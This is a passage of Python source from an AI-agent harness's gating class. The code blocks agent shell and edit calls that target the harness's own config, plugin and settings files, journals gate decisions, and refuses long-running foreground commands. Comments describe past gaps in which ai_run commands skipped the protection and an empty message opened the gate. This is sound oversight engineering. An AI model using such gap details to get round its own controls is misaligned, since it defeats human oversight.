                {"key": key, "lane_id": lane_id or ""},
                sort_keys=True,
                default=str,
            )
            reset_payload = _json.dumps(
                {"lane_id": lane_id or ""},
                sort_keys=True,
                default=str,
            )
            with self.hub.execution.connect(project_root) as conn:
                last_reset = conn.execute(
                    "SELECT observed_at FROM execution_events "
                    "WHERE event_kind = 'test_retry_reset' "
                    "AND COALESCE(session_id, '') = COALESCE(?, '') "
                    "AND payload_json = ? "
                    "ORDER BY observed_at DESC LIMIT 1",
                    (session_id or None, reset_payload),
                ).fetchone()
                reset_ts = last_reset["observed_at"] if last_reset else "1970-01-01T00:00:00Z"
                row = conn.execute(
                    "SELECT COUNT(DISTINCT event_id) FROM execution_events "
                    "WHERE event_kind = 'test_runner_invocation' "
                    "AND COALESCE(session_id, '') = COALESCE(?, '') "
                    "AND payload_json = ? "
                    "AND observed_at > ?",
                    (session_id or None, invocation_payload, reset_ts),
                ).fetchone()
                return int(row[0]) if row else 0
        except Exception:
            return 0

    def _journal_bash_decision(
        self,
        project_root: Path,
        session_id: str,
        command: str,
        decision: str,
        reason: str,
    ) -> None:
        """Append a bash-gate decision to the session journal.

        execution_events is the authoritative audit trail (bash_gate_*
        kinds, task_id stamped, Merkle-chained). But not every caller
        runs through the orchestrator translation path: direct unit
        tests, codex/opencode backends without the hook, and the
        dashboard's "review recent gate decisions" view all read the
        flat markdown journal. Writing here keeps both surfaces honest.

        No-op when session_id is empty (pre-session-bind) or when
        runtime/hub is unavailable. Failures are swallowed — journal
        writes are a side effect; the gate decision has already been
        made by the caller.
        """
        sid = str(session_id or "").strip()
        if not sid:
            return
        # Truncate long commands so journal lines stay grep-friendly.
        cmd_str = str(command or "").strip()
        MAX_CMD = 200
        if len(cmd_str) > MAX_CMD:
            cmd_str = cmd_str[: MAX_CMD - 3] + "..."
        outcome = f"{cmd_str} — {reason}" if reason else cmd_str
        # Cap outcome at 240 for readable journal rows.
        if len(outcome) > 240:
            outcome = outcome[:237] + "..."
        try:
            self.runtime.hub.sessions.write_journal_entry(
                project_root,
                sid,
                action_kind="bash_gate",
                intent=f"bash gate: {decision}",
                outcome=outcome,
            )
        except Exception:
            pass

    # Autowake heartbeat helpers REMOVED 2026-04-30 — see autowake-
    # removal commit. The four helpers (_workers_live,
    # _conductor_process_live, _conductor_backlog_empty,
    # _autowake_missing_or_stale) were only consumed by the autowake
    # advisory branch above. Reuse will revisit via stop-hook.

    def _check_infrastructure(
        self,
        tool_name: str,
        tool_input: dict[str, object],
        *,
        dev_mode: bool = False,
        allow_config_edit: bool = False,
    ) -> str | None:
        """Check infrastructure protection. Returns block reason or None.

        Surface coverage (2026-04-30): both shell entries (bash AND
        ai_run) and both edit entries (write AND edit) flow through
        this check. Pre-fix, only `bash` matched the shell branch —
        but native bash is T0-blocked under Invariant #38 and never
        reaches here in managed mode. Result was that ai_run-routed
        commands bypassed infrastructure protection entirely.
        """
        from .config import render_interaction_text

        name = tool_name.strip().lower()
        if name not in ("bash", "ai_run", "write", "edit"):
            return None

        is_shell = name in ("bash", "ai_run")
        target = ""
        if is_shell:
            raw_cmd = str(tool_input.get("command", ""))
            # Strip quoted regions (single, double, heredocs) before
            # pattern-matching so protected-filename strings inside a
            # `git commit -m "..."` body, a `printf "..."` prose line,
            # or a `python -c "..."` literal don't false-positive block
            # the whole command. The gate's intent is to catch tools
            # acting ON the protected path, not tools talking ABOUT it.
            cmd = _strip_bash_quoted_regions(raw_cmd).lower()
            for pattern in (
                "aidocs.toml",
                "aidocs-plugin.json",
                "aidocs_mcp",
                "core/plugins/aidocs.js",
                "plugins/aidocs.js",
            ):
                if pattern in cmd:
                    target = pattern
                    break
            # Config DB: only block mutations, not read-only queries
            if not target and ("aidocs.sqlite3" in cmd or "config_settings" in cmd):
                db_mutate = any(
                    kw in cmd
                    for kw in (
                        "insert ",
                        "update ",
                        "delete ",
                        "drop ",
                        "alter ",
                        "replace into",
                        ".commit(",
                        ".set(",
                    )
                )
                if db_mutate:
                    target = "aidocs.sqlite3"
        else:
            from .access_gate import PathInputConflict, _extract_path

            try:
                target = _extract_path(tool_input).lower()
            except PathInputConflict:
                # Reached only if a caller invoked _check_infrastructure
                # directly bypassing check_tool's entry-level refusal.
                # Refuse the infra check defensively rather than picking
                # one of the conflicting paths.
                return (
                    "Refused: conflicting path inputs in tool_input. "
                    "Send exactly one path-shaped key."
                )

        if not target:
            return None

        # 2026-04-25 audit fix: every branch now has an inline fallback
        # so a missing/broken interaction TOML pack cannot return empty
        # string. Prior bug: render_interaction_text returns "" on
        # missing key → caller treats falsy as "no block" → gate silently
        # opens. Documented in security-gates.md §9 audit closure.
        if "aidocs-plugin.json" in target:
            return (
                render_interaction_text(
                    "interaction.gate_messages.infrastructure_edit_blocked",
                    label="aidocs-plugin.json",
                )
                or "AIDOCS plugin manifest is protected: aidocs-plugin.json"
            )
        if "aidocs.toml" in target:
            return "aidocs.toml is deprecated. Settings are managed via the AIDOCS Dashboard (SQLite config store)."
        if "aidocs.sqlite3" in target:
            return (
                render_interaction_text(
                    "interaction.gate_messages.infrastructure_config_blocked",
                    path="aidocs.sqlite3 (settings database). Use the dashboard to change settings.",
                )
                or "AIDOCS config database is protected: aidocs.sqlite3 (use the dashboard to change settings)."
            )
        if (
            any(
                marker in target
                for marker in ("aidocs_mcp", "core/plugins/aidocs.js", "plugins/aidocs.js")
            )
            and not dev_mode
        ):
            return (
                render_interaction_text(
                    "interaction.gate_messages.infrastructure_source_blocked",
                    path=target,
                )
                or f"AIDOCS infrastructure source is protected: {target}"
            )

        return None

    def _suggest_mcp_alternative(self, tool_name: str, tool_input: dict[str, object]) -> str:
        """Suggest MCP alternatives for raw tools (advisory)."""
        name = tool_name.strip().lower()
        if name != "bash":
            return ""
        cmd = str(tool_input.get("command", ""))
        if not cmd.strip():
            return ""

        import re as _re

        read_tools = ("cat", "head", "tail", "grep", "rg", "find", "ls", "less", "more")
        file_exts = (
            ".py",
            ".ts",
            ".tsx",
            ".js",
            ".jsx",
            ".cs",
            ".go",
            ".rs",
            ".java",
            ".toml",
            ".json",
            ".yaml",
            ".yml",
            ".md",
        )

        segments = _re.split(r"\s*(?:&&|\|\||;|\|)\s*", cmd)
        for segment in segments:
            seg = segment.strip()
            if not seg:
                continue
            first_token = seg.split(None, 1)[0].lstrip("(").rstrip(")")
            first_token = first_token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
            if first_token not in read_tools:
                continue
            if any(ext in seg for ext in file_exts):
                return "Use AIDOCS tools (ai_get_lines, ai_find, ai_search) instead of bash for code files — saves tokens and grants indexed read access."
        return ""

    def _comment_quality_nudge(
        self,
        tool_name: str,
        tool_input: dict[str, object] | None = None,
    ) -> str:
        """Return comment quality reminder for edit tools.

        Fires only when the edit actually introduces comment syntax, so the
        reminder stays meaningful instead of training agents to ignore it.
        """
        name = tool_name.lower()
        edit_tool_names = (
            "edit",
            "write",
            "ai_edit_lines",
            "ai_str_replace",
            "ai_insert_lines",
            "ai_batch_edit",
            "ai_create_file",
        )
        if name not in edit_tool_names:
            return ""
        from .config import CODE_QUALITY_COMMENT_ENFORCEMENT

        if CODE_QUALITY_COMMENT_ENFORCEMENT not in ("strict", "advisory"):
            return ""

        text = self._extract_edit_text(tool_input or {})
        if not text or not self._contains_comment_syntax(text):
            return ""

        from .config import render_interaction_text

        return render_interaction_text("interaction.gate_messages.comment_quality")

    # Long-running bash command families. Each one routinely takes
    # minutes in the foreground; wedging the agent that long is the
    # incident that prompted this check. Patterns live on the class so
    # tests can parametrize without duplicating the list.
    _LONG_RUNNING_BASH_PATTERNS: tuple[str, ...] = (
        r"\bpytest\b",
        r"\bnpm\s+(install|i|ci|test|run\s+build)\b",
        r"\bpip\s+install\b",
        r"\byarn\s+(install|build|test)\b",
        r"\bcargo\s+(build|test|check)\b",
        r"\bdocker\s+build\b",
    )

    def _check_foreground_long_running(
        self,
        tool_name: str,
        tool_input: dict[str, object] | None,
        *,
        timeout_cap_seconds: int | None,
        run_in_background: bool,
    ) -> dict[str, object]:
        """Enforce or advise on long-running foreground bash invocations.

        Returns {"allowed": bool, "reason": str, "advisory": str}.

        With `timeout_cap_seconds` set (dashboard-owned config) the
        check HARD BLOCKS foreground long-runners so the agent must
        either background the call or narrow its scope — this stops
        the agent from burning minutes of conversation time on a
        single bash call. Without a cap, the same match degrades to a
        non-blocking advisory so existing projects keep working.

        Background invocations and non-matching commands are
        transparent — no block, no advisory.
        """
        default = {"allowed": True, "reason": "", "advisory": ""}
        if tool_name.strip().lower() != "bash":
            return default
        if run_in_background:
            return default
        command = str((tool_input or {}).get("command", ""))
        if not command:
            return default
        import re as _re

        lower = command.lower()
        matched = False
        for pattern in self._LONG_RUNNING_BASH_PATTERNS:
            if _re.search(pattern, lower):
                matched = True
                break
        if not matched:
            return default

        if timeout_cap_seconds is None:
            return {
                "allowed": True,
                "reason": "",
                "advisory": (
                    "Long-running command: set run_in_background=true on "
                    "Bash so the agent stays responsive while the job "
                    "runs; you'll get a completion notification."
                ),
            }
        return {
            "allowed": False,
            "reason": (
                f"Foreground long-running command refused — dashboard "
                f"cap is {timeout_cap_seconds}s and this command "
                f"matches a family that routinely exceeds it (pytest, "
                f"npm/pip/yarn/cargo/docker). Pass run_in_background="
                f"true on Bash, or narrow the scope (specific test "
                f"file, single package) so it fits."
            ),
            "advisory": "",
        }

    @staticmethod
    def _extract_edit_text(tool_input: dict[str, object]) -> str:
        candidates = (
            "new_string",
            "new_str",
            "new_content",
            "content",
        )
        for key in candidates:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                return value
        edits = tool_input.get("edits")
        if isinstance(edits, list):
            collected: list[str] = []
            for edit in edits:
                if isinstance(edit, dict):
                    for key in candidates:
                        value = edit.get(key)
                        if isinstance(value, str) and value:
                            collected.append(value)
                            break
            if collected:
                return "\n".join(collected)
        return ""

    @staticmethod
    def _contains_comment_syntax(text: str) -> bool:
        import re as _re

        patterns = (
            _re.compile(r"(?m)^\s*#(?!!)"),
            _re.compile(r"(?m)^\s*//"),
            _re.compile(r"/\*"),
            _re.compile(r'(?m)^\s*"""'),
            _re.compile(r"(?m)^\s*'''"),
            _re.compile(r"(?m)^\s*<!--"),
        )
        return any(p.search(text) for p in patterns)
